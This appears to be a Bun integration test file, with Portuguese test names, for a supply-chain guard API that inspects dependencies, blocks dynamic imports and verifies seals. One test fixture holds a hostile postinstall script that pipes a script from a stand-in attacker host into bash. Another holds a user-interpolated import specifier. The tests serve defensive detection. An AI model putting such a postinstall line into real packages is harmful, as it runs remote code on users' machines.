import { describe, it, expect } from 'bun:test';
import { app } from '../src/index';
import {
  DependencyThreatCategory,
  DependencyValidationAction
} from '@terapiainfoco/shared';

describe('Backend API Integration - Supply Chain & Dynamic Dependency Guard (SLSA L3, CWE-470, CWE-912)', () => {
  describe('GET /api/supply-chain-guard/overview', () => {
    it('deve retornar telemetria completa, métricas de auditoria SLSA L3 e incidentes', async () => {
      const res = await app.request('/api/supply-chain-guard/overview');
      expect(res.status).toBe(200);

      const data = await res.json();
      expect(data.success).toBe(true);
      expect(data.overview).toBeDefined();
      expect(data.overview.metrics.totalDependenciesAudited).toBeGreaterThan(0);
      expect(data.overview.policy.allowedScopes).toContain('@terapiainfoco');
      expect(data.overview.recentIncidents.length).toBeGreaterThan(0);
      expect(data.overview.homologatedDependencies.length).toBeGreaterThan(0);
    });
  });

  describe('POST /api/supply-chain-guard/inspect', () => {
    it('deve aprovar dependências legítimas com emissão de selo WORM RFC 8785', async () => {
      const res = await app.request('/api/supply-chain-guard/inspect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          dependencies: [
            {
              name: '@terapiainfoco/shared',
              version: '1.0.0',
              resolvedRegistry: 'https://npm.pkg.github.com',
              scope: '@terapiainfoco',
              integrity: 'sha512-mockSha512ValidHash12345678901234567890'
            }
          ]
        })
      });

      expect(res.status).toBe(200);
      const data = await res.json();
      expect(data.success).toBe(true);
      expect(data.result.isValid).toBe(true);
      expect(data.result.action).toBe(DependencyValidationAction.ALLOW);
      expect(data.seal.sealToken).toMatch(/^dep_chain_seal_/);
    });

    it('deve bloquear manifesto contendo backdoor de ciclo de vida (CWE-912)', async () => {
      const res = await app.request('/api/supply-chain-guard/inspect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          manifestContent: JSON.stringify({
            name: 'malicious-telemetry-pkg',
            version: '1.0.0',
            scripts: {
              postinstall: 'curl -s https://c2.attacker.com/beacon.sh | bash'
            }
          })
        })
      });

      expect(res.status).toBe(200);
      const data = await res.json();
      expect(data.success).toBe(true);
      expect(data.result.isValid).toBe(false);
      expect(data.result.action).toBe(DependencyValidationAction.BLOCK);
      expect(data.incident).toBeDefined();
      expect(data.incident.category).toBe(DependencyThreatCategory.MALICIOUS_LIFECYCLE_SCRIPT);
    });

    it('deve retornar 400 se nenhum conteúdo de manifesto ou dependência for fornecido', async () => {
      const res = await app.request('/api/supply-chain-guard/inspect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({})
      });

      expect(res.status).toBe(400);
      const data = await res.json();
      expect(data.success).toBe(false);
      expect(data.message).toContain('obrigatória');
    });
  });

  describe('POST /api/supply-chain-guard/inspect-import', () => {
    it('deve aprovar import estático de módulo seguro', async () => {
      const res = await app.request('/api/supply-chain-guard/inspect-import', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          specifier: './components/SecurityBadge.tsx',
          callerContext: 'AppRouter'
        })
      });

      expect(res.status).toBe(200);
      const data = await res.json();
      expect(data.success).toBe(true);
      expect(data.result.isAllowed).toBe(true);
      expect(data.result.action).toBe(DependencyValidationAction.ALLOW);
    });

    it('deve bloquear injeção dinâmica de módulos com interpolação de variáveis (CWE-470)', async () => {
      const res = await app.request('/api/supply-chain-guard/inspect-import', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          specifier: '`./modules/${userInput}`',
          callerContext: 'PluginManager'
        })
      });

      expect(res.status).toBe(200);
      const data = await res.json();
      expect(data.success).toBe(true);
      expect(data.result.isAllowed).toBe(false);
      expect(data.result.action).toBe(DependencyValidationAction.BLOCK);
      expect(data.incident).toBeDefined();
    });

    it('deve retornar 400 se specifier não for informado', async () => {
      const res = await app.request('/api/supply-chain-guard/inspect-import', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({})
      });

      expect(res.status).toBe(400);
      const data = await res.json();
      expect(data.success).toBe(false);
    });
  });

  describe('POST /api/supply-chain-guard/policy', () => {
    it('deve atualizar políticas de governança SLSA L3', async () => {
      const res = await app.request('/api/supply-chain-guard/policy', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          enforceStrictWhitelisting: true,
          blockLifecycleScripts: true,
          quarantinedPackages: ['legacy-crypto-polyfill']
        })
      });

      expect(res.status).toBe(200);
      const data = await res.json();
      expect(data.success).toBe(true);
      expect(data.policy.quarantinedPackages).toContain('legacy-crypto-polyfill');
    });
  });

  describe('POST /api/supply-chain-guard/simulate', () => {
    it('deve simular ataque de Dependency Confusion com bloqueio ativo', async () => {
      const res = await app.request('/api/supply-chain-guard/simulate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          attackCategory: DependencyThreatCategory.DEPENDENCY_CONFUSION
        })
      });

      expect(res.status).toBe(200);
      const data = await res.json();
      expect(data.success).toBe(true);
      expect(data.threatBlocked).toBe(true);
      expect(data.incident).toBeDefined();
      expect(data.attackCategory).toBe(DependencyThreatCategory.DEPENDENCY_CONFUSION);
    });

    it('deve simular ataque de injeção dinâmica de módulos (CWE-470)', async () => {
      const res = await app.request('/api/supply-chain-guard/simulate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          attackCategory: DependencyThreatCategory.DYNAMIC_IMPORT_INJECTION
        })
      });

      expect(res.status).toBe(200);
      const data = await res.json();
      expect(data.success).toBe(true);
      expect(data.threatBlocked).toBe(true);
      expect(data.attackCategory).toBe(DependencyThreatCategory.DYNAMIC_IMPORT_INJECTION);
    });
  });

  describe('POST /api/supply-chain-guard/verify-seal', () => {
    it('deve validar positivamente selo WORM RFC 8785 legítimo', async () => {
      // 1. Gera inspeção prévia para obter selo
      const inspRes = await app.request('/api/supply-chain-guard/inspect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          dependencies: [
            {
              name: 'react',
              version: '18.2.0',
              resolvedRegistry: 'https://registry.npmjs.org',
              integrity: 'sha512-mockSha512ValidHashReact18'
            }
          ]
        })
      });

      const inspData = await inspRes.json();
      const sealToken = inspData.seal.sealToken;

      // 2. Valida selo gerado
      const verifyRes = await app.request('/api/supply-chain-guard/verify-seal', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sealToken })
      });

      expect(verifyRes.status).toBe(200);
      const verifyData = await verifyRes.json();
      expect(verifyData.success).toBe(true);
      expect(verifyData.isValid).toBe(true);
    });

    it('deve rejeitar selo adulterado ou inválido', async () => {
      const verifyRes = await app.request('/api/supply-chain-guard/verify-seal', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sealToken: 'invalid_seal_signature_corrupted' })
      });

      expect(verifyRes.status).toBe(200);
      const verifyData = await verifyRes.json();
      expect(verifyData.isValid).toBe(false);
    });
  });

  describe('GET /api/supply-chain-guard/homologated', () => {
    it('deve retornar lista de pacotes homologados da arquitetura', async () => {
      const res = await app.request('/api/supply-chain-guard/homologated');
      expect(res.status).toBe(200);

      const data = await res.json();
      expect(data.success).toBe(true);
      expect(Array.isArray(data.packages)).toBe(true);
      expect(data.packages.some((p: any) => p.name === '@terapiainfoco/shared')).toBe(true);
    });
  });
});
